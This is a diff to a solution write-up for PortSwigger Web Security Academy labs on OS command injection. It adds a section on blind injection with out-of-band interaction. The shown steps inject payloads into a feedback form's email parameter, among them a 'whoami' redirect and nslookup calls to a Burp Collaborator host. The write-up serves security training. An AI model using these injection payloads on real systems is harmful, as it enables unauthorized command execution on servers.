@@ -7,6 +7,7 @@
 - [OS command injection, simple case](#os-command-injection-simple-case)
 - [Blind OS command injection with time delays](#blind-os-command-injection-with-time-delays)
 - [Blind OS command injection with output redirection](#blind-os-command-injection-with-output-redirection)
+- [Blind OS command injection with out-of-band interaction](#blind-os-command-injection-with-out-of-band-interaction)
 
 ## OS command injection, simple case
 Reference: https://portswigger.net/web-security/os-command-injection/lab-simple
@@ -67,3 +68,21 @@ email=||whoami>/var/www/images/output.txt||
 filename=output.txt
 ```
 5. Observe that the response contains the output from the injected command.
+
+## Blind OS command injection with out-of-band interaction
+Reference: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band
+
+<!-- omit in toc -->
+### Quick Solution
+As with the previous lab I used a different payload to solve the lab. I tried the following payload on every parameter of the **Submit feedback** request (until it worked with the ``email`` parameter):
+```
+%26nslookup%20your-burp-collaborator%26
+```
+
+<!-- omit in toc -->
+### Solution
+1. Use Burp Suite to intercept and modify the request that submits feedback.
+2. Modify the ``email`` parameter, changing it to:
+```
+email=x||nslookup+x.burpcollaborator.net||
+```
